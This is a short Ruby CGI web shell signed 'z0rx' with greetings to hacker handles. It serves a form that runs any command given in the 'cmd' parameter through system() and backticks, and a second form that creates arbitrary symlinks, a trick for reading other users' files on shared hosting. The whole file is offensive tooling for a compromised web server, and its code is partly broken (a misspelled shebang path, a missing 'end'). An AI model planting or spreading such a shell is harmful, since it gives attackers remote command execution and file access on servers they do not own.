#!/user/bin/ruby 
##
# Ruby cgi [cmd and symlink]
# by:z0rx
# 2011-2012
# Greetz to: Secure-x41, Hannibal ksa
##
require 'cgi'
cgi = CGI.new
puts cgi.header
cmd=cgi['cmd']
sym=cgi['sym']
z0rx=cgi['file']
print"<title>#Z0RX - Ruby CGI 5H311</title><b>Z0RX</b><br />
<form method='post'>
<input type='text' size='40' name='cmd'><input type='submit' name='ex' valu='Pwn!'><br /><br />
<input type='text' size='40' name='sym'><input type='text' size='40' name='file'><input type='submit' name='doo' valu='Symlink!'>
</form><br>";
if cgi['ex']
  zz = system("#{cmd}")
  puts "<pre>"
  print `#{zz}`
  print "</pre><br />"
if cgi['doo']
  puts "<pre>"
  File.symlink("#{sym}", "#{z0rx}")
  print "Symlink was : #{sym} =D And it has been saved in to this file : #{z0rx}"
  print "</pre><br />"
end
